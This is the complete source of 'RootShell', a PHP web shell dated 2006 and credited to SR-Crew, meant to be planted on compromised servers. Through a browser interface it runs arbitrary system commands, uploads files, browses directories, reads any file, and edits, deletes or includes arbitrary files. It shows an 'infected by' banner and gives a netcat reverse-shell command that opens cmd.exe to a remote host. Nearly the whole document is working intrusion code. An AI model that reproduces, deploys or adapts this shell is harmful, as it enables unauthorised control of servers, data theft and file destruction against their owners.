<body link="#000000" vlink="#000000" alink="#000000" bgcolor="#FFFFD5">
<style type="text/css">
body{
cursor:crosshair 
}
</style>
<div align="center" style="width: 100%; height: 100">
<pre width="100%" align="center"><strong> ____             _         ____  _          _ _
|  _ \ ___   ___ | |_      / ___|| |__   ___| | |
| |_) / _ \ / _ \| __|     \___ \| '_ \ / _ \ | |
|  _ < (_) | (_) | |_   _   ___) | | | |  __/ | |
|_| \_\___/ \___/ \__| (_) |____/|_| |_|\___|_|_|</pre>
</div></strong>
<b><u><center><font face='Verdana' style='font-size: 8pt'><?php echo "This server has been infected by $owner"; ?></font></center></u></b>
<hr color="#000000" size="2,5">

<div align="center">
  <center>
  <p>
  <?php 
// Get Dir Var
$dir = $_GET["d"];
if(!isset($dir)) { 
 $dir = "./";
}

// Check for safe mode
if( ini_get('safe_mode') ) {
   print '<font face="Verdana" color="#FF0000" style="font-size:10pt"><b>Safe Mode ON</b></font>';
} else {
   print '<font face="Verdana" color="#008000" style="font-size:10pt"><b>Safe Mode OFF</b></font>';
}

?>
&nbsp;</p><font face="Webdings" size="6">!</font><br>
&nbsp;<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1" height="25" bordercolor="#000000">
    <tr>
      <td width="1%" height="25" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ Server Info ]</font></td>
    </tr>
    <tr>
      <td width="49%" height="142">
      <p align="center">
        <font face="Verdana" style="font-size: 8pt"><b>Current Directory:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>
        <br />
        <b>Shell:</b> <? echo __FILE__ ?>
        <br>
        <b>Server Software:</b> <? echo $SERVER_SOFTWARE ?><br>
        <b>Server Name:</b> <? echo $SERVER_NAME ?><br>
        <b>Server Protocol:</b> <? echo $SERVER_PROTOCOL ?><br>
        </font></tr>
  </table><br />
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1" height="426" bordercolor="#000000">
    <tr>
      <td width="49%" height="25" bgcolor="#FCFEBA" valign="middle">
      <p align="center"><font face="Verdana" size="2">[ Command Execute ]</font></td>
      <td width="51%" height="26" bgcolor="#FCFEBA" valign="middle">
      <p align="center"><font face="Verdana" size="2">[ File Upload ]</font></td>
    </tr>
    <tr>
      <td width="49%" height="142">
      <p align="center"><form method="post">
<p align="center">
<br>
<font face="Verdana" style="font-size: 8pt">Insert your commands here:</font><br>
<br>
<textarea size="70" name="command" rows="2" cols="40" ></textarea> <br>
<br><input type="submit" value="Execute!"><br>
&nbsp;<br></p>
      </form>
      <p align="center">
        <textarea readonly size="1" rows="7" cols="53"><?php @$output = system($_POST['command']); ?></textarea><br>
        <br>
        <font face="Verdana" style="font-size: 8pt"><b>Info:</b> For a connect 
        back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>
        </i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align="center"><br>
<form enctype="multipart/form-data" method="post">
<p align="center"><br>
<br>
<font face="Verdana" style="font-size: 8pt">Here you can upload some files.</font><br>
<br>
<input type="file" name="file" size="20"><br>
<br>
<font style="font-size: 5pt">&nbsp;</font><br>
<input type="submit" value="Upload File!"> <br>
&nbsp;</p>
</form>
<?php

function check_file()
{
global $file_name, $filename;
    $backupstring = "copy_of_";
    $filename = $backupstring."$filename";

    if( file_exists($filename))
    {
        check_file();
    }
}

if(!empty($file))
{
    $filename = $file_name;
    if( file_exists($file_name))
    {
        check_file();
        echo "<p align=center>File already exist</p>";
    }

    else
    {
        copy($file,"$filename");
        if( file_exists($filename))
        {
            echo "<p align=center>File uploaded successful</p>";
        }
        elseif(! file_exists($filename))
        {
            echo "<p align=center>File not found</p>";
        }
    }
}
?> 
<font face="Verdana" style="font-size: 8pt">
<p align=\"center\"></font>
</td>

      </tr>
      <tr>
      <td style="overflow:auto" width="49%" height="25" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ Directories ]</font></td>
      <td width="51%" height="19" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ File Viewer ]</font></td>
      </tr>
      <tr>
      <td style="overflow:auto" width="49%" height="231">
<font face="Verdana" style="font-size: 11pt">
      <p align="center">
<div align="center" style="overflow:auto; width:99%; height:175">
<?
 if (is_dir($dir)) {
  if ($dh = opendir($dir)) {
   while (($file = readdir($dh)) !== false) {
    if ((filetype($dir . $file)) == "dir") {
     echo "<b><a href='".$_SERVER["PHP_SELF"]."?d=".$dir.$file."/'>".$file."</a></b><br />\n";
    } else {
     echo "<a href='".$_SERVER["PHP_SELF"]."?r=".$dir.$file."&d=".$dir."'>".$file."</a><br />\n";
    }
   }
  closedir($dh); 
  }
 }
?>
</div>
<p align="center">&nbsp;</td>
      <td width="51%" height="232">
      <p align="center"><font face="Verdana" style="font-size: 8pt"><br>
     <form name="frm">
        <p align="center"><textarea name="filvw" rows="13" cols="55"><?
       @$read = $_GET["r"];
       if(isset($read)) { 
        @$handle = fopen($read, "r");
        @$contents = fread($handle, filesize($read));
        @fclose($handle);
        if ($contents == "") {
		echo "No file loaded...";
		exit();
	}
        echo htmlentities($contents); 
       }
      ?></textarea><br>
        <br>
<input type="button" onclick="document.frm.filvw.rows='30';" name="resize" style="width: 34; height: 26" value="+">
<input type="button" onclick="document.frm.filvw.rows='13';" name="normalize" style="width: 34; height: 26" value="-"><br>
&nbsp;</p>
      </form>
      </p>
      </td>
      </tr>
    <tr>
      <td width="49%" height="25" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ File Editor ]</font></td>
      <td width="51%" height="19" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ Notices ]</font></td>
    </tr>
    <tr>
      <td width="49%" height="231">
<font face="Verdana" style="font-size: 11pt">
      <p align="center"><?
$scriptname = $_SERVER['SCRIPT_NAME'];
$filename = $_POST["filename"];

if($_POST["submit"] == "Open")
{
	if(file_exists($filename))
	{
		$filecontents = htmlentities(file_get_contents($filename));

		if(!$filecontents)
			$status = "<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>";
	}
	else
		$status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
}		
else if($_POST["submit"] == "Delete")
{
	if(file_exists($filename))
	{
		if(unlink($filename))	
			$status = "<font face='Verdana' style='font-size: 8pt'>File successfully deleted!</font>";
		else
			$status = "<font face='Verdana' style='font-size: 8pt'>Could not delete file!</font>";
	}
	else
		$status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
}
else if($_POST["submit"] == "Save")
{
	$filecontents = stripslashes(html_entity_decode($_POST["contents"]));

	if(file_exists($filename))
		unlink($filename);

	$handle = fopen($filename, "w");

	if(!$handle)
		$status = "<font face='Verdana' style='font-size: 8pt'>Could not open file for write access! </font>";
	else
	{
		if(!fwrite($handle, $filecontents))
			$status = $status."<font face='Verdana' style='font-size: 8pt'>Could not write to file! (Maybe you didn't enter any text?)</font>";

		fclose($handle);
	}

	$filecontents = htmlentities($filecontents);
}
else
{
	$status = "<font face='Verdana' style='font-size: 8pt'>No file loaded!</font>";
}
?>
<table border="0" align="center">
		
		<tr>
			<td>
				<table width="100%" border="0">
				<tr>
					<td>
						<form method="post" action="<?echo $scriptname;?>">
							<input name="filename" type="text" value="<?echo $filename;?>" size="20">
							<input type="submit" name="submit" value="Open">
							<input type="submit" name="submit" value="Delete">
					</td>
				</tr>
				</table>
			</td>
		</tr>

		<tr>
			<td>
					<font face="Verdana" style="font-size: 11pt">
					<textarea name="contents" cols="53" rows="8"><?echo $filecontents;?></textarea></font><br>
					<input type="submit" name="submit" value="Save">
					<input type="reset" value="Reset">
				</form>
			</td>
		</tr>

		<tr>
			<td>
				<h2><?echo $status;?></h2>
			</td>
		</tr>
		</table>				</td>
      <td width="51%" height="232">
      <p align="center"><font face="Verdana" style="font-size: 8pt"><br>
      <textarea rows="13" cols="55"></textarea><br>
      &nbsp;</font><?php @$output = include($_POST['incl']); ?></td>
    </tr>
  </table>
  </center>
</div><br>
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1" height="25" bordercolor="#000000">
    <tr>
      <td width="1%" height="25" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ Remove Shell ]</font></td>
    </tr>
    <tr>
      <td width="49%" height="142">
      <p align="center">
        <form method="POST">
          <p align="center"><font face="Verdana"><font size="2"><b>Type &quot;remove&quot; 
          to remove the RootShell </b><br>
          <br><input name="rm" type="text" size="20"><br>
          <br>
          </font><input type="submit" value="Remove Me"></font></p>
      </form>  <? if ($_POST['rm'] == "remove") { unlink(__FILE__); echo "<script>alert('Thank you for using the RootShell!');self.location.href='http://www.sr-crew.org';</script>"; } ?>    </tr>
  </table>
    <p align="center">
<br /></p>
    </p>
<div align="center">
  <center>
  <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
    <tr>
      <td width="100%" bgcolor="#FCFEBA" height="20">
      <p align="center"><font face="Verdana" size="2">Rootshell v<?php echo "$version" ?>  � 2006 by <a style="text-decoration: none" target="_blank" href="http://www.SR-Crew.org">SR-Crew</a> </font></td>
    </tr>
  </table>
  </center>
</div>